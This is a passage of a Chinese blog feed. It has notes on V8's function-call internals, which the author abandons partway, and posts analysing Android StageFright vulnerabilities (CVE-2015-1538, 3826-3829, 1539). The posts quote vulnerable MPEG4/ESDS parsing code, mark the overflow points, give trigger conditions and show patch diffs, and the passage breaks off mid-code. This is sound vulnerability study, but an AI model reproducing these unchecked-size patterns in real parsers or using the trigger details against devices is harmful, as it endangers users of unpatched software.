class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Local&lt;FunctionTemplate&gt; ft = FunctionTemplate::New(isolate_, function_callback, data);</span><br><span class="line">Local&lt;Function&gt; function = ft-&gt;GetFunction(context).ToLocalChecked();</span><br></pre></td></tr></table></figure><p>函数是这样被调用的：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MaybeLocal&lt;Value&gt; ret = function-&gt;Call(context, recv, <span class="number">0</span>, <span class="literal">nullptr</span>);</span><br></pre></td></tr></table></figure><p>Function::Call在这里src/api/api.cc:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">bool</span> has_pending_exception = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">auto</span> self = Utils::OpenHandle(<span class="keyword">this</span>);</span><br><span class="line">i::Handle&lt;i::Object&gt; recv_obj = Utils::OpenHandle(*recv);</span><br><span class="line">i::Handle&lt;i::Object&gt;* args = <span class="keyword">reinterpret_cast</span>&lt;i::Handle&lt;i::Object&gt;*&gt;(argv);</span><br><span class="line">Local&lt;Value&gt; result;</span><br><span class="line">has_pending_exception = !ToLocal&lt;Value&gt;(</span><br><span class="line">    i::Execution::Call(isolate, self, recv_obj, argc, args), &amp;result);</span><br></pre></td></tr></table></figure><p>注意到<code>Call</code>的返回结果是<code>MaybeHandle&lt;Object&gt;</code>类型，将被传入ToLocal<value>，在这里定义的<code>api.h</code>:</value></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">inline</span> <span class="title">bool</span> <span class="title">ToLocal</span>(<span class="title">v8</span>:</span>:internal::MaybeHandle&lt;v8::internal::Object&gt; maybe,</span><br><span class="line">                    Local&lt;T&gt;* local) &#123;</span><br><span class="line">  v8::internal::Handle&lt;v8::internal::Object&gt; handle;</span><br><span class="line">  <span class="keyword">if</span> (maybe.ToHandle(&amp;handle)) &#123;</span><br><span class="line">    *local = Utils::Convert&lt;v8::internal::Object, T&gt;(handle);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span>;</span><br></pre></td></tr></table></figure><p>再康一眼<code>Execution::Call</code>在这里<code>execution/execution.cc</code>：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> Invoke(isolate, InvokeParams::SetUpForCall(isolate, callable, receiver, argc, argv));</span><br></pre></td></tr></table></figure><p><code>SetUpForCall</code> 将返回一个 <code>InvokeParams</code>. TODO: 进一步康康 InvokeParams.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">V8_WARN_UNUSED_RESULT MaybeHandle&lt;Object&gt; Invoke(Isolate* isolate,</span><br><span class="line">                                                 <span class="keyword">const</span> InvokeParams&amp; params) &#123;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Handle&lt;Object&gt; receiver = params.is_construct</span><br><span class="line">                                    ? isolate-&gt;factory()-&gt;the_hole_value()</span><br><span class="line">                                    : params.receiver;</span><br></pre></td></tr></table></figure><p>弃坑了，抱歉，发现效率一般，决定不看这个，边看源码边google不懂的地方，读带师傅们的博客。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;a href=&quot;https://github.com/danbev/learning-v8&quot;&gt;https://github.com/danbev/learning-v8&lt;/a&gt;，这是原文，可以让我看嘤文的话脑子基本不在线，所以边翻译边学习。&lt;/p&gt;
&lt;h2 id=&quot;介绍&quot;
      
    
    </summary>
    
    
      <category term="二进制" scheme="https://github.com/Cracke-S-J/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/"/>
    
      <category term="v8" scheme="https://github.com/Cracke-S-J/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/v8/"/>
    
    
      <category term="二进制" scheme="https://github.com/Cracke-S-J/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/"/>
    
      <category term="v8" scheme="https://github.com/Cracke-S-J/tags/v8/"/>
    
  </entry>
  
  <entry>
    <title>StageFright 系列漏洞（二——五）</title>
    <link href="https://github.com/Cracke-S-J/2020/05/30/StageFright-%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%EF%BC%88%E4%BA%8C%E2%80%94%E2%80%94%E4%BA%94%EF%BC%89/"/>
    <id>https://github.com/Cracke-S-J/2020/05/30/StageFright-%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%EF%BC%88%E4%BA%8C%E2%80%94%E2%80%94%E4%BA%94%EF%BC%89/</id>
    <published>2020-05-30T15:38:26.000Z</published>
    <updated>2020-06-07T10:34:33.313Z</updated>
    
    <content type="html"><![CDATA[<h2 id="二-CVE-2015-3828-CVE-2015-3826"><a href="#二-CVE-2015-3828-CVE-2015-3826" class="headerlink" title="二 CVE-2015-3828 / CVE-2015-3826"></a>二 CVE-2015-3828 / CVE-2015-3826</h2><p>在<code>status_t MPEG4Extractor::parse3GPPMetaData(off64_t offset, size_t size, int depth)</code>这个函数中，有一个翻车的整数越界：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (metadataKey &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">bool</span> isUTF8 = <span class="literal">true</span>; <span class="comment">// Common case</span></span><br><span class="line">    <span class="keyword">char16_t</span> *framedata = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">int</span> len16 = <span class="number">0</span>; <span class="comment">// Number of UTF-16 characters</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (size - <span class="number">6</span> &gt;= <span class="number">4</span>) &#123;                <span class="comment">// &lt;-- 这里，如果size是个负数</span></span><br><span class="line">        len16 = ((size - <span class="number">6</span>) / <span class="number">2</span>) - <span class="number">1</span>;   <span class="comment">// don't include 0x0000 terminator</span></span><br><span class="line">        framedata = (<span class="keyword">char16_t</span> *)(buffer + <span class="number">6</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="number">0xfffe</span> == *framedata) &#123;</span><br><span class="line">            <span class="comment">// endianness marker (BOM) doesn't match host endianness</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len16; i++) &#123;</span><br><span class="line">                framedata[i] = bswap_16(framedata[i]);      <span class="comment">// &lt;-- 这里，越界，越界大小端转换</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// BOM is now swapped to 0xfeff, we will execute next block too</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="number">0xfeff</span> == *framedata) &#123;</span><br><span class="line">            <span class="comment">// Remove the BOM</span></span><br><span class="line">            framedata++;</span><br><span class="line">            len16--;</span><br><span class="line">            isUTF8 = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// else normal non-zero-length UTF-8 string</span></span><br><span class="line">        <span class="comment">// we can't handle UTF-16 without BOM as there is no other</span></span><br><span class="line">        <span class="comment">// indication of encoding.</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (isUTF8) &#123;</span><br><span class="line">        mFileMetaData-&gt;setCString(metadataKey, (<span class="keyword">const</span> <span class="keyword">char</span> *)buffer + <span class="number">6</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Convert from UTF-16 string to UTF-8 string.</span></span><br><span class="line">        String8 tmpUTF8str(framedata, len16);               <span class="comment">// &lt;-- 这里应该没问题</span></span><br><span class="line">        mFileMetaData-&gt;setCString(metadataKey, tmpUTF8str.<span class="built_in">string</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="三-CVE-2015-3827"><a href="#三-CVE-2015-3827" class="headerlink" title="三 CVE-2015-3827"></a>三 CVE-2015-3827</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">case FOURCC('c', 'o', 'v', 'r'):</span><br><span class="line">&#123;</span><br><span class="line">    *offset += chunk_size;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (mFileMetaData != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        ALOGV(<span class="string">"chunk_data_size = %lld and data_offset = %lld"</span>,</span><br><span class="line">                chunk_data_size, data_offset);</span><br><span class="line"></span><br><span class="line">        sp&lt;ABuffer&gt; buffer = <span class="keyword">new</span> ABuffer(chunk_data_size + <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (mDataSource-&gt;readAt(</span><br><span class="line">            data_offset, buffer-&gt;data(), chunk_data_size) != (<span class="keyword">ssize_t</span>)chunk_data_size) &#123;</span><br><span class="line">            <span class="keyword">return</span> ERROR_IO;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">int</span> kSkipBytesOfDataBox = <span class="number">16</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 这里没有判断 chunk_data_size 和 16 的大小，溢出</span></span><br><span class="line">        mFileMetaData-&gt;setData(</span><br><span class="line">            kKeyAlbumArt, MetaData::TYPE_NONE,</span><br><span class="line">            buffer-&gt;data() + kSkipBytesOfDataBox, chunk_data_size - kSkipBytesOfDataBox);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> MetaData::typed_data::setData(</span><br><span class="line">        <span class="keyword">uint32_t</span> type, <span class="keyword">const</span> <span class="keyword">void</span> *data, <span class="keyword">size_t</span> size) &#123;</span><br><span class="line">    clear();</span><br><span class="line"></span><br><span class="line">    mType = type;</span><br><span class="line">    allocateStorage(size);</span><br><span class="line">    <span class="built_in">memcpy</span>(storage(), data, size);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>回溯一下，看chunk_data_size来自哪：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">off64_t</span> chunk_data_size = *offset + chunk_size - data_offset;</span><br></pre></td></tr></table></figure><p>chunk_size的值&lt;=24会触发漏洞。</p><h2 id="四-CVE-2015-3829"><a href="#四-CVE-2015-3829" class="headerlink" title="四 CVE-2015-3829"></a>四 CVE-2015-3829</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">case FOURCC('c', 'o', 'v', 'r'):</span><br><span class="line">&#123;</span><br><span class="line">    *offset += chunk_size;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (mFileMetaData != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        ALOGV(<span class="string">"chunk_data_size = %lld and data_offset = %lld"</span>,</span><br><span class="line">                chunk_data_size, data_offset);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// patch</span></span><br><span class="line">        <span class="comment">// if (chunk_data_size &gt;= SIZE_MAX - 1) &#123;</span></span><br><span class="line">        <span class="comment">//     return ERROR_MALFORMED;</span></span><br><span class="line">        <span class="comment">// &#125;</span></span><br><span class="line">        <span class="comment">// 如果chunk_data_size + 1 &gt;= SIZE_MAX的话</span></span><br><span class="line">        <span class="comment">// 这里长度分配为零或者分配的比较小，就空指针引用或者越界操作了</span></span><br><span class="line">        sp&lt;ABuffer&gt; buffer = <span class="keyword">new</span> ABuffer(chunk_data_size + <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (mDataSource-&gt;readAt(</span><br><span class="line">            data_offset, buffer-&gt;data(), chunk_data_size) != (<span class="keyword">ssize_t</span>)chunk_data_size) &#123;</span><br><span class="line">            <span class="keyword">return</span> ERROR_IO;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">int</span> kSkipBytesOfDataBox = <span class="number">16</span>;</span><br><span class="line">        <span class="keyword">if</span> (chunk_data_size &lt;= kSkipBytesOfDataBox) &#123;</span><br><span class="line">            <span class="keyword">return</span> ERROR_MALFORMED;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        mFileMetaData-&gt;setData(</span><br><span class="line">            kKeyAlbumArt, MetaData::TYPE_NONE,</span><br><span class="line">            buffer-&gt;data() + kSkipBytesOfDataBox, chunk_data_size - kSkipBytesOfDataBox);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="五-CVE-2015-1539"><a href="#五-CVE-2015-1539" class="headerlink" title="五 CVE-2015-1539"></a>五 CVE-2015-1539</h2><p>这里 -= 2 的时候有溢出：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">status_t</span> ESDS::parseESDescriptor(<span class="keyword">size_t</span> offset, <span class="keyword">size_t</span> size) &#123;</span><br><span class="line">    <span class="keyword">if</span> (size &lt; <span class="number">3</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> ERROR_MALFORMED;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    offset += <span class="number">2</span>;  <span class="comment">// skip ES_ID</span></span><br><span class="line">    size -= <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> streamDependenceFlag = mData[offset] &amp; <span class="number">0x80</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> URL_Flag = mData[offset] &amp; <span class="number">0x40</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> OCRstreamFlag = mData[offset] &amp; <span class="number">0x20</span>;</span><br><span class="line"></span><br><span class="line">    ++offset;</span><br><span class="line">    --size;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (streamDependenceFlag) &#123;</span><br><span class="line">        <span class="keyword">if</span> (size &lt; <span class="number">2</span>)</span><br><span class="line">            <span class="keyword">return</span> ERROR_MALFORMED;</span><br><span class="line">        offset += <span class="number">2</span>;</span><br><span class="line">        size -= <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>根据patch来看，还有几处：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">@@ <span class="number">-136</span>,<span class="number">6</span> +<span class="number">136</span>,<span class="number">8</span> @@</span><br><span class="line">    --size;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (streamDependenceFlag) &#123;</span><br><span class="line">+        <span class="keyword">if</span> (size &lt; <span class="number">2</span>)</span><br><span class="line">+            <span class="keyword">return</span> ERROR_MALFORMED;</span><br><span class="line">        offset += <span class="number">2</span>;</span><br><span class="line">        size -= <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">@@ <span class="number">-145</span>,<span class="number">11</span> +<span class="number">147</span>,<span class="number">15</span> @@</span><br><span class="line">            <span class="keyword">return</span> ERROR_MALFORMED;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">unsigned</span> URLlength = mData[offset];</span><br><span class="line">+        <span class="keyword">if</span> (URLlength &gt;= size)</span><br><span class="line">+            <span class="keyword">return</span> ERROR_MALFORMED;</span><br><span class="line">        offset += URLlength + <span class="number">1</span>;</span><br><span class="line">        size -= URLlength + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (OCRstreamFlag) &#123;</span><br><span class="line">+        <span class="keyword">if</span> (size &lt; <span class="number">2</span>)</span><br><span class="line">+            <span class="keyword">return</span> ERROR_MALFORMED;</span><br><span class="line">        offset += <span class="number">2</span>;</span><br><span class="line">        size -= <span class="number">2</span>;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;二-CVE-2015-3828-CVE-2015-3826&quot;&gt;&lt;a href=&quot;#二-CVE-2015-3828-CVE-2015-3826&quot; class=&quot;headerlink&quot; title=&quot;二 CVE-2015-3828 / CVE-2015-3826&quot;&gt;&lt;
      
    
    </summary>
    
    
      <category term="Android" scheme="https://github.com/Cracke-S-J/categories/Android/"/>
    
    
      <category term="Android" scheme="https://github.com/Cracke-S-J/tags/Android/"/>
    
  </entry>
  
  <entry>
    <title>StageFright 系列漏洞（一）CVE-2015-1538</title>
    <link href="https://github.com/Cracke-S-J/2020/05/24/StageFright-%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%EF%BC%88%E4%B8%80%EF%BC%89CVE-2015-1538/"/>
    <id>https://github.com/Cracke-S-J/2020/05/24/StageFright-%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%EF%BC%88%E4%B8%80%EF%BC%89CVE-2015-1538/</id>
    <published>2020-05-24T15:18:33.000Z</published>
    <updated>2020-06-07T10:34:42.344Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://github.com/jduck/cve-2015-1538-1">https://github.com/jduck/cve-2015-1538-1</a></p><p><a href="https://wooyun.js.org/drops/CVE-2015-1538%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B8%AD%E7%9A%84Shellcode%E5%88%86%E6%9E%90.html" target="_blank" rel="noopener">https://wooyun.js.org/drops/CVE-2015-1538%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B8%AD%E7%9A%84Shellcode%E5%88%86%E6%9E%90.html</a></p><p><a href="https://www.madebug.net/static/drops/papers-7558.html" target="_blank" rel="noopener">https://www.madebug.net/static/drops/papers-7558.html</a></p><h2 id="漏洞点（误）cve编号对不上，我也不知道这个哪个cve，害"><a href="#漏洞点（误）cve编号对不上，我也不知道这个哪个cve，害" class="headerlink" title="漏洞点（误）cve编号对不上，我也不知道这个哪个cve，害"></a>漏洞点（误）cve编号对不上，我也不知道这个哪个cve，害</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">case FOURCC('t', 'i', 't', 'l'):</span><br><span class="line">case FOURCC('p', 'e', 'r', 'f'):</span><br><span class="line">case FOURCC('a', 'u', 't', 'h'):</span><br><span class="line">case FOURCC('g', 'n', 'r', 'e'):</span><br><span class="line">case FOURCC('a', 'l', 'b', 'm'):</span><br><span class="line">case FOURCC('y', 'r', 'r', 'c'):</span><br><span class="line">&#123;</span><br><span class="line">    *offset += chunk_size;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// invoke parse3GPPMetaData.</span></span><br><span class="line">    <span class="keyword">status_t</span> err = parse3GPPMetaData(data_offset, chunk_data_size, depth);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (err != OK) &#123;</span><br><span class="line">        <span class="keyword">return</span> err;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">status_t</span> MPEG4Extractor::parse3GPPMetaData(<span class="keyword">off64_t</span> offset, <span class="keyword">size_t</span> size, <span class="keyword">int</span> depth) &#123;</span><br><span class="line">    <span class="keyword">if</span> (size &lt; <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> ERROR_MALFORMED;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// size don't include 0x0000 terminator</span></span><br><span class="line">    <span class="keyword">uint8_t</span> *buffer = <span class="keyword">new</span> (<span class="built_in">std</span>::nothrow) <span class="keyword">uint8_t</span>[size];</span><br><span class="line">    <span class="keyword">if</span> (buffer == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> ERROR_MALFORMED;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (mDataSource-&gt;readAt(</span><br><span class="line">                offset, buffer, size) != (<span class="keyword">ssize_t</span>)size) &#123;</span><br><span class="line">        <span class="keyword">delete</span>[] buffer;</span><br><span class="line">        buffer = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ERROR_IO;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint32_t</span> metadataKey = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">switch</span> (mPath[depth]) &#123;</span><br><span class="line">        case FOURCC('t', 'i', 't', 'l'):</span><br><span class="line">        &#123;</span><br><span class="line">            metadataKey = kKeyTitle;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        case FOURCC('p', 'e', 'r', 'f'):</span><br><span class="line">        &#123;</span><br><span class="line">            metadataKey = kKeyArtist;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        case FOURCC('a', 'u', 't', 'h'):</span><br><span class="line">        &#123;</span><br><span class="line">            metadataKey = kKeyWriter;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        case FOURCC('g', 'n', 'r', 'e'):</span><br><span class="line">        &#123;</span><br><span class="line">            metadataKey = kKeyGenre;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        case FOURCC('a', 'l', 'b', 'm'):</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (buffer[size - <span class="number">1</span>] != <span class="string">'\0'</span>) &#123;</span><br><span class="line">              <span class="keyword">char</span> tmp[<span class="number">4</span>];</span><br><span class="line">              <span class="built_in">sprintf</span>(tmp, <span class="string">"%u"</span>, buffer[size - <span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">              mFileMetaData-&gt;setCString(kKeyCDTrackNumber, tmp);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            metadataKey = kKeyAlbum;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        case FOURCC('y', 'r', 'r', 'c'):</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">char</span> tmp[<span class="number">5</span>];</span><br><span class="line">            <span class="keyword">uint16_t</span> year = U16_AT(&amp;buffer[<span class="number">4</span>]);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (year &lt; <span class="number">10000</span>) &#123;</span><br><span class="line">                <span class="built_in">sprintf</span>(tmp, <span class="string">"%u"</span>, year);</span><br><span class="line"></span><br><span class="line">                mFileMetaData-&gt;setCString(kKeyYear, tmp);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (metadataKey &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">bool</span> isUTF8 = <span 